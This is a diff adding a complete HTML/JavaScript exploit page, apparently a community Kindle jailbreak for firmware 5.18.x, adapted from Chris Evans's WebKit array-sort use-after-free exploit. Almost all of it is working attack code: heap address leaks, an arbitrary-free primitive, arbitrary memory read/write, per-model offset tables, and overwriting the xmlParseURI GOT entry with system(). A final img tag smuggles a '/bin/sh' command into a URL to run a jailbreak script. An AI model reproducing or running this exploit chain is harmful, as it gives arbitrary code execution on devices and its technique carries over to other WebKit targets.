@@ -1,0 +1,207 @@
+<!-- 
+CVE-2012-3748 webkit-based JB for Kindles. Full credit to Chris Evans (@scarybeasts) for the majority of the exploit code. Give his blog a read if you're interested in the bug:
+  https://scarybeastsecurity.blogspot.com/2017/05/ode-to-use-after-free-one-vulnerable.html
+
+Adapted by hhhhhhhhh for the Kindle Modding Community. Included offsets are for 5.18.1 - 5.18.5.
+-->
+
+<html>
+<body>
+<script>
+var i;
+var a1;
+var a2;
+var sort_iters = 0;
+var aliased_uint32array;
+var vtable;
+var conv_buf = new ArrayBuffer(8);
+var conv_view = new DataView(conv_buf);
+var stolen_double = 0;
+var raw_arr_addr;
+var free_arr;
+var free_addr;
+var raw_arr_alias_buf;
+var raw_hashmap_addr;
+var raw_uint32_alias_buf;
+
+const offsets = { // Probably a better way to do this ¯\_(ツ)_/¯
+  '441754': { memcpy_got: 0xab8a4, xml_got: 0xabfe8, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_all_new_paperwhite_11th_5.18.1
+  '441755': { memcpy_got: 0xab81c, xml_got: 0xabf60, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_all_new_paperwhite_12th_5.18.1
+  '441756': { memcpy_got: 0xab8a4, xml_got: 0xabfe8, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_all_new_oasis_v2_5.18.1
+  '441757': { memcpy_got: 0xab81c, xml_got: 0xabf60, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_11th_2024_5.18.1
+  '441758': { memcpy_got: 0xab9a0, xml_got: 0xac0ec, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_colorsoft_5.18.1
+  '441759': { memcpy_got: 0xab8a4, xml_got: 0xabfe8, memcpy_offset: 0x7e140, system_offset: 0x39b88 }, // fs_update_kindle_10th_5.18.1
+  '441760': { memcpy_got: 0xab8a4, xml_got: 0xabfe8, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_11th_5.18.1
+  '441761': { memcpy_got: 0xab8a4, xml_got: 0xabfe8, memcpy_offset: 0x7e140, system_offset: 0x39b88 }, // fs_update_kindle_all_new_paperwhite_v2_5.18.1
+  '441762': { memcpy_got: 0xab81c, xml_got: 0xabf60, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_scribe_5.18.1
+  '441763': { memcpy_got: 0xab81c, xml_got: 0xabf60, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_scribe_2024_5.18.1
+  '443453': { memcpy_got: 0xab81c, xml_got: 0xabf60, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_all_new_paperwhite_12th_5.18.2
+  '443454': { memcpy_got: 0xab8a4, xml_got: 0xabfe8, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_all_new_paperwhite_11th_5.18.2
+  '443455': { memcpy_got: 0xab8a4, xml_got: 0xabfe8, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_all_new_oasis_v2_5.18.2
+  '443456': { memcpy_got: 0xab8a4, xml_got: 0xabfe8, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_11th_5.18.2
+  '443457': { memcpy_got: 0xab9a0, xml_got: 0xac0ec, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_colorsoft_5.18.2
+  '443458': { memcpy_got: 0xab81c, xml_got: 0xabf60, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_scribe_5.18.4
+  '443459': { memcpy_got: 0xab81c, xml_got: 0xabf60, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_scribe_2024_5.18.2
+  '444629': { memcpy_got: 0xbe4ac, xml_got: 0xbebd4, memcpy_offset: 0x94c00, system_offset: 0x42938 }, // fs_update_kindle_11th_2024_5.18.1.5
+  '446665': { memcpy_got: 0xbe4ac, xml_got: 0xbebd8, memcpy_offset: 0x94c00, system_offset: 0x42938 }, // fs_update_kindle_11th_2024_5.18.3
+  '446667': { memcpy_got: 0xac744, xml_got: 0xace94, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_colorsoft_5.18.3
+  '446668': { memcpy_got: 0xac740, xml_got: 0xace88, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_11th_5.18.3
+  '446669': { memcpy_got: 0xac740, xml_got: 0xace88, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_all_new_paperwhite_12th_5.18.3
+  '446670': { memcpy_got: 0xac740, xml_got: 0xace88, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_all_new_paperwhite_11th_5.18.3
+  '446672': { memcpy_got: 0xac740, xml_got: 0xace88, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_scribe_2024_5.18.3
+  '446676': { memcpy_got: 0xac740, xml_got: 0xace88, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_scribe_5.18.3
+  '450742': { memcpy_got: 0xbe4ac, xml_got: 0xbebd8, memcpy_offset: 0x94c00, system_offset: 0x42938 }, // fs_update_kindle_11th_2024_5.18.4
+  '450743': { memcpy_got: 0xac740, xml_got: 0xace88, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_11th_5.18.4
+  '450744': { memcpy_got: 0xac740, xml_got: 0xace88, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_all_new_paperwhite_12th_5.18.4
+  '450745': { memcpy_got: 0xac744, xml_got: 0xace94, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_colorsoft_5.18.4
+  '450746': { memcpy_got: 0xac740, xml_got: 0xace88, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_all_new_paperwhite_11th_5.18.4
+  '450748': { memcpy_got: 0xac740, xml_got: 0xace88, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_scribe_2024_5.18.4
+  '452773': { memcpy_got: 0xac740, xml_got: 0xace88, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_all_new_paperwhite_11th_5.18.4.0.1
+  '452774': { memcpy_got: 0xac744, xml_got: 0xace94, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_colorsoft_5.18.4.0.1
+  '452775': { memcpy_got: 0xac740, xml_got: 0xace88, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_all_new_paperwhite_12th_5.18.4.0.1
+  '452776': { memcpy_got: 0xac740, xml_got: 0xace88, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_11th_5.18.4.0.1
+  '452778': { memcpy_got: 0xbe4ac, xml_got: 0xbebd8, memcpy_offset: 0x94c00, system_offset: 0x42938 }, // fs_update_kindle_11th_2024_5.18.4.0.1
+  '452779': { memcpy_got: 0xac740, xml_got: 0xace88, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_scribe_2024_5.18.4.0.1
+  '454602': { memcpy_got: 0xac740, xml_got: 0xace88, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_11th_5.18.5
+  '454603': { memcpy_got: 0xbe4ac, xml_got: 0xbebd8, memcpy_offset: 0x94c00, system_offset: 0x42938 }, // fs_update_kindle_11th_2024_5.18.5
+  '454604': { memcpy_got: 0xbe4ac, xml_got: 0xbebd8, memcpy_offset: 0x94c00, system_offset: 0x42938 }, // fs_update_kindle_all_new_paperwhite_12th_5.18.5
+  '454605': { memcpy_got: 0xac744, xml_got: 0xace94, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_colorsoft_5.18.5
+  '454606': { memcpy_got: 0xac740, xml_got: 0xace88, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_all_new_paperwhite_11th_5.18.5
+  '454607': { memcpy_got: 0xbe4ac, xml_got: 0xbebd8, memcpy_offset: 0x94c00, system_offset: 0x42938 }, // fs_update_kindle_scribe_2024_5.18.5
+  '454608': { memcpy_got: 0xbe4ac, xml_got: 0xbebd8, memcpy_offset: 0x94c00, system_offset: 0x42938 }, // fs_update_kindle_scribe_5.18.5
+};
+
+
+var myLeakCompFunc = function(x,y)
+{
+  console.log("sorting: " + x + " and " + y);
+  if (stolen_double == 0 && x != 0 && x != 1 && x != 2) {
+    stolen_double = x;
+  }
+  if (!sort_iters) {
+    console.log("splicing array...");
+    a1.splice(0, 4);
+  }
+  sort_iters++;
+  return 0;
+}
+
+var myFreeCompFunc = function(x,y)
+{
+  console.log("sorting: " + x + " and " + y);
+  console.log("expanding array...");
+  free_arr[2] = 0xff;
+  var tmp_arr = new Uint32Array(10);
+  tmp_arr[2] = free_addr;
+  return 0;
+}
+
+var doRawFree = function()
+{
+  free_arr = [1,2];
+  free_arr.sort(myFreeCompFunc);
+  console.log("freed: 0x" + free_addr.toString(16));
+}
+
+// Allocates an array buffer object of raw size 64 bytes. 24 bytes header and
+// 5*8 == 40 bytes of array values. Goes in the fastMalloc() heap.
+a1 = [1,2,3,4,5];
+
+// This sort does a splice in the middle, resulting in the array buffer object
+// header structure gettting copied into the array values area. We can then
+// recover the header structure values during the sort.
+a1.sort(myLeakCompFunc);
+
+// The array values are doubles, and one of them is a pointer from the header
+// which we can convert and recover. The pointer is actually a pointer to the
+// array buffer object allocation itself.
+conv_view.setFloat64(0, stolen_double, true);
+raw_arr_addr = conv_view.getUint32(0, true);
+
+// a1 ends up one element large. Set a second element to cause an expansion
+// that reallocates the array buffer object. This leaves a 64-byte memory
+// hole where the old array buffer object was, and we know that address.
+// Expand a1.
+a1[1] = 0xee;
+
+// Allocate a uint array whose buffer is 64 bytes. This will end up getting
+// placed in the memory hole we just created, and we know its address! (uint
+// array buffer objects also go in the fastMalloc() heap).
+raw_arr_alias_buf = new Uint32Array(16);
+
+// fastFree() the address where we just put the uint32 backing buffer. We do the
+// fastFree() by abusing a use-after-free in the Array sort logic. If we
+// reallocate the array buffer object in the middle of the sort, the code uses
+// the old, stale array buffer object. This lets us supply our own allocation
+// that gets treated as the array buffer object. Within the array buffer object,
+// there's a pointer that gets free'd if it is present. So we have a primitive
+// that lets us fastFree() arbitrary pointers.
+free_addr = raw_arr_addr;
+doRawFree();
+
+// Create a new array with associated array buffer object, of 64 bytes. This
+// will go in to the memory location we just fastFree()'d above. There's a
+// uint32 array buffer that is aliased to this new allocation (i.e. holds a
+// stale pointer to it). This lets us read and write the array buffer object
+// through a uint32 buffer API.
+// We set up the array so that it is "sparse". This causes the array buffer
+// object's header to contain a pointer to a HashMap, which is a 20 byte
+// structure that goes into a 24 byte fastMalloc() heap slot.
+// We read out the pointer to this 24 byte slot.
+a2 = [6,7,8,9,10];
+a2[0x80000000] = 1234;
+
+raw_hashmap_addr = raw_arr_alias_buf[2];
+
+// We truncate the array back down, causing it to become "un-sparse". This
+// fastFree()s the 20 byte HashMap object, leaving a heap hole of 24 bytes at
+// a known address.
+a2.length = 5;
+
+// We fill the 24 byte heap hole with a 24 byte uint32 backing buffer.
+raw_uint32_alias_buf = new Uint32Array(6);
+
+// We know the address of the 24 byte uint32 backing buffer, so we can use our
+// freeing primitive to fastFree() it.
+free_addr = raw_hashmap_addr;
+doRawFree();
+
+// Allocate another uint32 object. The main metadata object for a uint32 object
+// is 24 bytes, so it will go into the heap hole we just made, with a different
+// uint32 backing buffer aliased to it.
+aliased_uint32array = new Uint32Array(1);
+
+// Now we can use our aliased uint32 buffer to read and write the 24 byte
+// metadata object for a uint32 buffer:
+// - It starts with a vtable pointer, which is very useful.
+// - It has a pointer and a length that determine access to the raw buffer. By
+// corrupting these, we can gain absolute access to the entire address space.
+vtable = raw_uint32_alias_buf[0];
+new Date("hello");
+raw_uint32_alias_buf[2] = 0;
+raw_uint32_alias_buf[5] = 0x40000000;
+
+
+var kindle = window.kindle || top.kindle;
+var ver = String(kindle.device.getSoftwareVersionNumber()).slice(0,6);
+alert("Version number is: " + ver);
+
+var entry = offsets[ver];
+var memcpy_got = entry.memcpy_got;
+var xml_got = entry.xml_got;
+var memcpy_offset = entry.memcpy_offset;
+var system_offset = entry.system_offset;
+
+const libc_memcpy = aliased_uint32array[memcpy_got >>2];
+const libc_base = libc_memcpy - memcpy_offset;
+alert("Libc base address is: 0x" + libc_base.toString(16));
+
+const libc_system = libc_base + system_offset;
+alert("Libc system() is at: 0x" + libc_system.toString(16));
+aliased_uint32array[xml_got >>2] = libc_system; // Replace the GOT for xmlParseURI() with system()
+
+alert("Bang!");
+</script>
+<img src="http://127.0.0.1/?a=;/bin/sh${IFS}/mnt/us/system/.assets/jb.sh"></img>
+</body>
+</html>
